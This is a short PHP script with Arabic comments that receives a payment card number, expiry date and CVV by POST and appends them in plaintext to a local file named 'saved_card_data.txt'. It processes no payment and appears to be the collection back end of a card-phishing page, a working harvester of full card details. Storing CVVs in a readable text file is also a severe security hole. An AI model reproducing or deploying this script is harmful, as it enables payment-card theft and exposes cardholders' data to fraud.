<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // استلام البيانات عبر POST
    $cardNumber = isset($_POST['cardNumber']) ? $_POST['cardNumber'] : '';
    $expiryDate = isset($_POST['expiryDate']) ? $_POST['expiryDate'] : '';
    $cvv = isset($_POST['cvv']) ? $_POST['cvv'] : '';

    // التحقق من أن جميع الحقول تم ملؤها
    if (!empty($cardNumber) && !empty($expiryDate) && !empty($cvv)) {
        // البيانات التي سيتم حفظها
        $data = "رقم البطاقة: " . $cardNumber . "\n";
        $data .= "تاريخ الانتهاء: " . $expiryDate . "\n";
        $data .= "رقم الأمان (CVV): " . $cvv . "\n\n";

        // مسار الملف الذي سيتم حفظ البيانات فيه
        $file = 'saved_card_data.txt';

        // حفظ البيانات في الملف
        if (file_put_contents($file, $data, FILE_APPEND)) {
            echo "تم حفظ بيانات البطاقة بنجاح!";
        } else {
            echo "حدث خطأ أثناء حفظ البيانات.";
        }
    } else {
        echo "يرجى ملء جميع الحقول.";
    }
} else {
    echo "الطلب غير صحيح.";
}
?>
